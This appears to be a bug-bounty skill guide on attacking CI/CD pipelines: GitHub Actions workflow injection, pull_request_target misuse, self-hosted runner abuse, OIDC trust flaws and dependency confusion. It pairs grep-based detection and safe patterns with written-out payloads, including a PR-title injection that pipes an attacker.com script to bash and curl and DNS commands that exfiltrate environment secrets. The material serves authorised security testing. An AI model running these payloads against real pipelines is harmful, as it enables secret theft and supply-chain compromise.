---
name: cicd-pipeline-attacks
description: CI/CD pipeline attacks — GitHub Actions workflow injection, pull_request_target misuse, secret exfiltration, self-hosted runner poisoning, OIDC token theft, and dependency confusion / supply chain
---

# CI/CD Pipeline Attacks

CI/CD pipelines are high-value targets — a single workflow injection can give code execution on the build runner, read every org secret, and push backdoored releases to production. Test whenever a target has public repos with GitHub Actions, CircleCI, Jenkins, or GitLab CI.

## Attack Surface

- Injectable event contexts interpolated into `run:` shell blocks
- `pull_request_target` workflows that check out untrusted PR code
- Secrets referenced in workflow `env:`/`run:` blocks
- Self-hosted runners reachable from fork PRs
- OIDC trust policies for cloud credential exchange
- Unpinned third-party actions and internal package references (dependency confusion)

## Workflow Injection (Critical)

GitHub Actions exposes PR/issue data as context variables. Interpolated directly into a `run:` block, the attacker controls shell code.

```yaml
# VULNERABLE — attacker controls pr.title
- run: echo "Title: ${{ github.event.pull_request.title }}"
# PR title payload:  "; curl attacker.com/shell.sh | bash #
```
```yaml
# SAFE — pass through env, never interpolate directly
- env: { PR_TITLE: ${{ github.event.pull_request.title }} }
  run: echo "Title: $PR_TITLE"
```

**Always-injectable contexts:** `github.event.pull_request.title|body|head.ref`, `github.event.issue.title|body`, `github.event.comment.body`, `github.event.review.body`, `github.event.review_comment.body`, `github.event.discussion.title|body`, `github.head_ref`, `github.event.inputs.*` (workflow_dispatch).

```bash
grep -rn '\${{.*github\.event\.\(pull_request\|issue\|comment\|review\|discussion\)' .github/workflows/
grep -rn '\${{.*github\.head_ref' .github/workflows/
grep -rn '\${{.*github\.event\.inputs' .github/workflows/
```

## pull_request_target Misuse (Critical)

`pull_request_target` runs in the BASE repo context (has secrets) but can be tricked into checking out and running attacker code:
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with: { ref: ${{ github.event.pull_request.head.sha }} }  # attacker code
      - run: npm test   # runs attacker's package.json scripts with secret access
```
```bash
grep -rn 'pull_request_target' .github/workflows/
grep -A20 'pull_request_target' .github/workflows/*.yml | grep -E '(head\.sha|head_ref|checkout)'
```

## Secret Exfiltration

```bash
grep -rn 'echo.*secrets\.\|cat.*secrets\.' .github/workflows/
```
`GITHUB_TOKEN` with broad `permissions:` (`contents: write`, `packages: write`, `pull-requests: write`) can push code, publish packages, approve PRs. Exfil from an injected `run:` block:
```bash
curl "https://attacker.com/?d=$(printenv | base64 -w0)"
nslookup "$(printenv SECRET | md5sum | cut -c1-20).attacker.com"   # DNS, stealthier
```

## Self-Hosted Runner Poisoning

Public repos with self-hosted runners let any fork queue jobs on internal machines.
```bash
grep -rn 'self-hosted' .github/workflows/
grep -B5 'self-hosted' .github/workflows/*.yml | grep -E '(pull_request|push)'
```
Exploit: fork → PR with a `runs-on: self-hosted` step → job runs on internal runner → hit `169.254.169.254` metadata, internal network, exfil secrets.

## OIDC Token Theft / Cloud Credential Abuse

Actions can request short-lived cloud creds via OIDC; over-broad trust policies let any branch/repo assume elevated roles.
```bash
grep -rn 'id-token.*write\|configure-aws-credentials\|google-github-actions\|azure/login' .github/workflows/
```
Check: what role is assumed, is the trust policy scoped to a specific branch (`ref:refs/heads/main`) or wildcarded (`repo:org/*:*`), can it be triggered from a fork/feature branch, and what permissions the role holds.

## Dependency Confusion / Supply Chain

- **Unpinned actions** (`uses: owner/action@main`/`@v1`) — hijackable if the maintainer account or tag is compromised; pin to a commit SHA.
- **Dependency confusion** — find internal package names in `package.json`/`requirements.txt`; if not published on the public registry, publish a malicious higher-version package → build server installs it.
```bash
grep -rn '"registry"' package.json .npmrc
grep -rn 'index-url\|extra-index-url' requirements.txt pip.conf setup.py
```

## Bug Class Severity

| Bug | Trigger | Severity |
|---|---|---|
| Workflow injection via PR title | context var in `run:` | Critical |
| `pull_request_target` + PR checkout | accepts fork PRs | Critical |
| Self-hosted runner on public repo | `self-hosted` + public | High |
| OIDC trust too broad | any-branch/any-repo claim | High |
| Dependency confusion | internal pkg not on public registry | High |
| Secret in log | `echo ${{ secrets.X }}` | Medium |
| Unpinned action | `@main`/`@v1` | Low–Medium |

## Chaining

- IDOR on repo settings → read CI/CD secret names → workflow injection to exfil → full org secret compromise.
- Unpinned internal action → compromise the action → next CI run pulls it with repo write access → backdoored releases.

## Tooling

`sisakulint` (workflow lint), `trufflehog`/`gitleaks` (secrets in git history/logs), `gh` CLI (public run logs: `gh run view <id> --log --repo owner/repo`; `gh secret list` shows names only), `nuclei -tags cicd`.

## Scope Notes

Most programs scope **public** repos only — confirm before touching private org repos. Self-hosted runner / injection PoCs require opening a real PR — confirm the program allows this and never trigger workflows affecting production infrastructure.

## Validation

Prove a DNS/HTTP callback from an injected command (not just a merged workflow file), or show a specific secret name reachable by the vulnerable job. A tampered-but-rejected workflow is not a finding.
